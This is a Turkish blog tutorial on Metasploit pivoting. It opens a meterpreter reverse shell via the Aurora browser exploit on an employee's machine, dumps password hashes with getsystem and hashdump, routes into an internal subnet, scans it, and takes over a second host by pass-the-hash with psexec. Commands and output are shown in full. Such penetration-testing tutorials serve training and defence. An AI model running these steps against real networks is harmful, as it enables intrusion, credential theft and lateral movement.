---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:33:00Z"
excerpt: Bir sistemde meterpreter shell oturumu açtığınızı varsayalım. Oturum açtığınız
  sistem, ağda bulunan ancak tam yetkili bir bilgisayar olmayabilir. Bu ilk oturum
  açtığınız sistemi bir sıçrama tahtası olarak kullanıp aynı ağdaki diğer bilgisayarlara
  erişmeye pivoting adı verilmektedir. Başka bir terminolojide kıyı başı veya giriş
  noktası olarak isimlendirildiğine de rast gelebilirsiniz.
guid: https://www.siberoloji.com/?p=1191
id: 1191
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Pivoting
url: /tr/msf-pivoting/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="pivoting-nedir">Pivoting Nedir? 
<!-- /wp:heading -->

  Bir sistemde meterpreter shell oturumu açtığınızı varsayalım. Oturum açtığınız sistem, ağda bulunan ancak tam yetkili bir bilgisayar olmayabilir. Bu ilk oturum açtığınız sistemi bir sıçrama tahtası olarak kullanıp aynı ağdaki diğer bilgisayarlara erişmeye&nbsp;***pivoting*** &nbsp;adı verilmektedir. Başka bir terminolojide&nbsp;***kıyı başı*** &nbsp;veya&nbsp;***giriş noktası*** &nbsp;olarak isimlendirildiğine de rast gelebilirsiniz. 
 

  Normalde doğrudan erişimi bulunmayan sunucu veya ağ sistemlerine, pivoting kullanarak erişme şansınız bulunmaktadır. Aşağıda inceleyeceğimiz senaryoda, meterpreter shell açılan bir bilgisayarın ağ bağlantılarını kullanarak, başka bir bilgisayara ulaşmayı deneyeceğiz. Bunu yaparken, meterpreter’in sunduğu rotalama imkanından yararlanacağız. 
 

 
<h2 class="wp-block-heading" id="1bilgisayara-shell-açalım">1.Bilgisayara Shell Açalım
<!-- /wp:heading -->

  Burada kullanılan&nbsp;<code>exploit/windows/browser/ms10_002_aurora</code>&nbsp;modülü sayesinde, hazırlanan zararlı bir linke tıklayan şirket çalışanının bilgisayarında oturum açılmaktadır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  use exploit/windows/browser/ms10_002_aurora 
msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  show options

Module options:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SRVHOST     0.0.0.0          yes       The local host to listen on.
   SRVPORT     8080             yes       The local port to listen on.
   SSL         false            no        Negotiate SSL ***for *** incoming connections
   SSLVersion  SSL3             no        Specify the version of SSL that should be used ***(*** accepted: SSL2, SSL3, TLS1***)*** 
   URIPATH                      no        The URI to use ***for *** this exploit ***(*** default is random***)*** 


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  set URIPATH /
URIPATH ***=&gt;***  /
msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD ***=&gt;***  windows/meterpreter/reverse_tcp
msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  set LHOST 192.168.1.101
LHOST ***=&gt;***  192.168.1.101
msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  exploit -j
***[*** ******* ***]***  Exploit running as background job.

***[*** ******* ***]***  Started reverse handler on 192.168.1.101:4444 
***[*** ******* ***]***  Using URL: <a href="http://0.0.0.0:8080/">http://0.0.0.0:8080/</a>
***[*** ******* ***]***   Local IP: <a href="http://192.168.1.101:8080/">http://192.168.1.101:8080/</a>
***[*** ******* ***]***  Server started.
msf exploit***(*** ms10_002_aurora***)***  ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Açılan yeni oturumu&nbsp;<code>sessions -l</code>&nbsp;komutuyla görebilirsiniz. Aşağıdaki listede kendi IP adresimizden&nbsp;<code>LHOST: 192.168.1.101</code>&nbsp;diğer hedef bilgisayara&nbsp;<code>RHOST:192.168.1.201</code>&nbsp;bağlantı kurulduğu görülmektedir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  
***[*** ******* ***]***  Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
***[*** ******* ***]***  Sending stage ***(*** 749056 bytes***)***  to 192.168.1.201
***[*** ******* ***]***  Meterpreter session 1 opened ***(*** 192.168.1.101:4444 -&gt; 192.168.1.201:8777***)***  at Mon Dec 06 08:22:29 -0700 2010

msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  sessions -l

Active sessions
***===============*** 

  Id  Type                   Information                                      Connection
  --  ----                   -----------                                      ----------
  1   meterpreter x86/win32  XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE  192.168.1.101:4444 -&gt; 192.168.1.201:8777

msf exploit***(*** ms10_002_aurora***)***  ***&gt;*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="1bilgisayarın-ağ-kartları">1.Bilgisayarın Ağ Kartları
<!-- /wp:heading -->

  Şimdi bu oturuma girelim ve&nbsp;<code>ipconfig</code>&nbsp;komutuyla hedef bilgisayarın ağ ayarlarına bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  sessions -i 1
***[*** ******* ***]***  Starting interaction with 1...

meterpreter ***&gt;***  ipconfig

Citrix XenServer PV Ethernet Adapter <em>#2 - Packet Scheduler Miniport</em>
Hardware MAC: d2:d6:70:fa:de:65
IP Address  : 10.1.13.3
Netmask     : 255.255.255.0



MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0



Citrix XenServer PV Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC: c6:ce:4e:d9:c9:6e
IP Address  : 192.168.1.201
Netmask     : 255.255.255.0


meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Bizim oturum açtığımız bilgisayarın IP adresinden anlıyoruz ki bağlandığımız ağ kartı&nbsp;<code>Citrix XenServer PV Ethernet Adapter - Packet Scheduler Miniport</code>&nbsp;isimli karttır. 
 

  Oysa sistemde 
 

  <code>MS TCP Loopback interface</code>&nbsp;ve 
 

  <code>Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport</code> 
 

  isimli 2 kart daha var. Bunlardan&nbsp;<code>MS TCP Loopback interface</code>&nbsp;isimli arayüz, zaten&nbsp;<code>localhost</code>&nbsp;olarak kullanılan iletişim aracıdır. 
 

  O zaman,&nbsp;<code>Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport</code>&nbsp;isimli diğer ağ yapılandırmasına odaklanalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">Citrix XenServer PV Ethernet Adapter <em>#2 - Packet Scheduler Miniport</em>
Hardware MAC: d2:d6:70:fa:de:65
IP Address  : 10.1.13.3
Netmask     : 255.255.255.0
</code></pre>
<!-- /wp:code -->

  Bu bilgilerden anladığımız kadarıyla&nbsp;<code>Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport</code>&nbsp;isimli kartın IP adresi&nbsp;<code>10.1.13.3</code>. O zaman bu ağa bağlananlara&nbsp;<code>10.1.13.1-255</code>&nbsp;aralığında IP adresleri verildiğini anlıyoruz. CIDR formatında bu&nbsp;<code>10.1.13.0/24</code>&nbsp;olarak gösteriliyor. 
 

  Meterpreter’in sağladığı imkanlardan bir tanesi de&nbsp;<code>autoroute</code>&nbsp;script kodudur. autoroute hakkında yardımı görüntüleyelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run autoroute -h
***[*** ******* ***]***  Usage:   run autoroute ***[*** -r***]***  -s subnet -n netmask
***[*** ******* ***]***  Examples:
***[*** ******* ***]***    run autoroute -s 10.1.1.0 -n 255.255.255.0  <em># Add a route to 10.10.10.1/255.255.255.0</em>
***[*** ******* ***]***    run autoroute -s 10.10.10.1                 <em># Netmask defaults to 255.255.255.0</em>
***[*** ******* ***]***    run autoroute -s 10.10.10.1/24              <em># CIDR notation is also okay</em>
***[*** ******* ***]***    run autoroute -p                            <em># Print active routing table</em>
***[*** ******* ***]***    run autoroute -d -s 10.10.10.1              <em># Deletes the 10.10.10.1/255.255.255.0 route</em>
***[*** ******* ***]***  Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
</code></pre>
<!-- /wp:code -->

  Şimdi otomatik rotalama yapalım. Bunun için aşağıdaki komutu kullanıyoruz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run autoroute -s 10.1.13.0/24
***[*** ******* ***]***  Adding a route to 10.1.13.0/255.255.255.0...
***[*** +] Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
***[*** ******* ***]***  Use the -p option to list all active routes
</code></pre>
<!-- /wp:code -->

  Rotalama yapıldı. Kontrol edelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run autoroute -p

Active Routing Table
***====================*** 

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.1.13.0          255.255.255.0      Session 1

meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="2bilgisayara-bağlantı">2.Bilgisayara Bağlantı
<!-- /wp:heading -->

  İlk bilgisayarda&nbsp;<code>getsystem</code>&nbsp;komutuyla hash bilgilerini elde edelim. Bu hash bilgilerini kullanarak 2. bilgisayara bağlanmaya çalışacağız. Ağdaki bilgisayarların, hash değerleriyle yetki kontrolü yaptığını hatırlayın. Bu teknikle ilgili&nbsp;<a href="https://siberoloji.github.io/metaspliot-framework-yetki-yukseltme/">Metasploit Framework Yetki Yükseltme</a>&nbsp;yazısına bakabilirsiniz. 
 

  Aşağıdaki komutlarla,&nbsp;<code>getsystem</code>&nbsp;ile SYSTEM bilgilerini elde ediyoruz,&nbsp;<code>hashdump</code>&nbsp;ile hash bilgilerini alıyoruz ve&nbsp;<code>CTRL+Z</code>&nbsp;tuşları ile oturumu arka plana gönderiyoruz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  getsystem
...got system ***(*** via technique 1***)*** .

meterpreter ***&gt;***  run hashdump
***[*** ******* ***]***  Obtaining the boot key...
***[*** ******* ***]***  Calculating the hboot key using SYSKEY c2ec80f879c1b5dc8d2b64f1e2c37a45...
***[*** ******* ***]***  Obtaining the user list and keys...
***[*** ******* ***]***  Decrypting user keys...
***[*** ******* ***]***  Dumping password hashes...


Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9a6ae26408b0629ddc621c90c897b42d:07a59dbe14e2ea9c4792e2f189e2de3a:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:ebf9fa44b3204029db5a8a77f5350160:::
victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::


meterpreter ***&gt;***  
Background session 1? ***[*** y/N]  
msf exploit***(*** ms10_002_aurora***)***  ***&gt;*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="2bilgisayar-ağını-tarama">2.Bilgisayar Ağını Tarama
<!-- /wp:heading -->

  Rotalama sayesinde artık 2. bilgisayar ağı ile haberleşebiliyoruz. O zaman bu ağı tarayalım ve&nbsp;<code>139</code>&nbsp;ile&nbsp;<code>445</code>&nbsp;numaralı portları açık olup olmadığına bakalım. İsterseniz tüm portları da tarayabilirsiniz. Biz sadece örnek vermek için bu iki portu tarayacağız. Bu tarama işlemi için&nbsp;<code>auxiliary/scanner/portscan/tcp</code>&nbsp;modülünü kullanacağız. Modülde RHOSTS değişkenini&nbsp;<code>RHOSTS 10.1.13.0/24</code>&nbsp;olarak ayarladığımıza dikkat edin. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  use auxiliary/scanner/portscan/tcp 
msf auxiliary***(*** tcp***)***  ***&gt;***  show options

Module options:

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string ***for *** capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-10000          yes       Ports to scan ***(*** e.g. 22-25,80,110-900***)*** 
   RHOSTS                        yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout ***in *** milliseconds
   VERBOSE      false            no        Display verbose output

msf auxiliary***(*** tcp***)***  ***&gt;***  set RHOSTS 10.1.13.0/24
RHOST ***=&gt;***  10.1.13.0/24
msf auxiliary***(*** tcp***)***  ***&gt;***  set PORTS 139,445
PORTS ***=&gt;***  139,445
msf auxiliary***(*** tcp***)***  ***&gt;***  set THREADS 50
THREADS ***=&gt;***  50
msf auxiliary***(*** tcp***)***  ***&gt;***  run

***[*** ******* ***]***  10.1.13.3:139 - TCP OPEN
***[*** ******* ***]***  10.1.13.3:445 - TCP OPEN
***[*** ******* ***]***  10.1.13.2:445 - TCP OPEN
***[*** ******* ***]***  10.1.13.2:139 - TCP OPEN
***[*** ******* ***]***  Scanned 256 of 256 hosts ***(*** 100% complete***)*** 
***[*** ******* ***]***  Auxiliary module execution completed
msf auxiliary***(*** tcp***)***  ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Yapılan tarama sonucunda&nbsp;<code>10.1.13.2</code>&nbsp;ve&nbsp;<code>10.1.13.3</code>&nbsp;olarak 2 IP adresi bulduk. Bunlardan&nbsp;<code>10.1.13.3</code>&nbsp;IP adresi zaten bizim 1. bilgisayara ait olduğundan&nbsp;<code>10.1.13.2</code>&nbsp;IP adresine odaklanacağız. 
 

 
<h2 class="wp-block-heading" id="bağlantı-yapalım">Bağlantı Yapalım
<!-- /wp:heading -->

  445 numaralı portun&nbsp;<code>samba</code>&nbsp;ağ paylaşım işlemlerinden kullanıldığını biliyoruz. Öyleyse,&nbsp;<code>exploit/windows/smb/psexec</code>&nbsp;modülünü kullanabiliriz. Modül ayarlarını yaparken, ilk bilgisayardan elde ettiğimiz&nbsp;<code>Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d</code>&nbsp;hash değerlerini girdiğimize dikkat edin. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary***(*** tcp***)***  ***&gt;***  use exploit/windows/smb/psexec 
msf exploit***(*** psexec***)***  ***&gt;***  show options

Module options:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOST                       yes       The target address
   RPORT      445              yes       Set the SMB service port
   SMBDomain  WORKGROUP        no        The Windows domain to use ***for *** authentication
   SMBPass                     no        The password ***for *** the specified username
   SMBUser                     no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit***(*** psexec***)***  ***&gt;***  set RHOST 10.1.13.2
RHOST ***=&gt;***  10.1.13.2

msf exploit***(*** psexec***)***  ***&gt;***  set SMBUser Administrator
SMBUser ***=&gt;***  Administrator

msf exploit***(*** psexec***)***  ***&gt;***  set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
SMBPass ***=&gt;***  81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d

msf exploit***(*** psexec***)***  ***&gt;***  set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD ***=&gt;***  windows/meterpreter/bind_tcp

msf exploit***(*** psexec***)***  ***&gt;***  exploit

***[*** ******* ***]***  Connecting to the server...
***[*** ******* ***]***  Started bind handler
***[*** ******* ***]***  Authenticating to 10.1.13.2:445|WORKGROUP as user 'Administrator'...
***[*** ******* ***]***  Uploading payload...
***[*** ******* ***]***  Created \qNuIKByV.exe...
***[*** ******* ***]***  Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
***[*** ******* ***]***  Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
***[*** ******* ***]***  Obtaining a service manager handle...
***[*** ******* ***]***  Creating a new service ***(*** UOtrbJMd - "MNYR"***)*** ...
***[*** ******* ***]***  Closing service handle...
***[*** ******* ***]***  Opening service...
***[*** ******* ***]***  Starting the service...
***[*** ******* ***]***  Removing the service...
***[*** ******* ***]***  Closing service handle...
***[*** ******* ***]***  Deleting \qNuIKByV.exe...
***[*** ******* ***]***  Sending stage ***(*** 749056 bytes***)*** 
***[*** ******* ***]***  Meterpreter session 2 opened ***(*** 192.168.1.101-192.168.1.201:0 -&gt; 10.1.13.2:4444***)***  at Mon Dec 06 08:56:42 -0700 2010

meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Gördüğünüz gibi 2. bilgisayara bağlantı sağladık. Bu bağlantıyı yukarıda&nbsp;<code>[*] Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -&gt; 10.1.13.2:4444)</code>&nbsp;satırından da görebileceğiniz gibi&nbsp;<code>192.168.1.101-192.168.1.201:0 -&gt; 10.1.13.2:4444</code>&nbsp;rotasını takip ederek yaptık. 
 

  192.168.1.101: Kendi bilgisayarımız 
 

  192.168.1.201: Pivot olarak kullanılan bilgisayar 
 

  10.1.13.2: Erişim sağlanan 2. bilgisayar. 
 

  İkinci bilgisayarın&nbsp;<code>ipconfig</code>&nbsp;ayarlarına bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ipconfig

Citrix XenServer PV Ethernet Adapter
Hardware MAC: 22:73:ff:12:11:4b
IP Address  : 10.1.13.2
Netmask     : 255.255.255.0



MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0


meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Görüldüğü gibi&nbsp;***pivoting*** &nbsp;çok güçlü bir tekniktir. Bir ağda, herhangi bir bilgisayara erişim sağladıktan sonra, ağdaki diğer sistemlere ulaşmanızda size yardımcı olmaktadır. 
 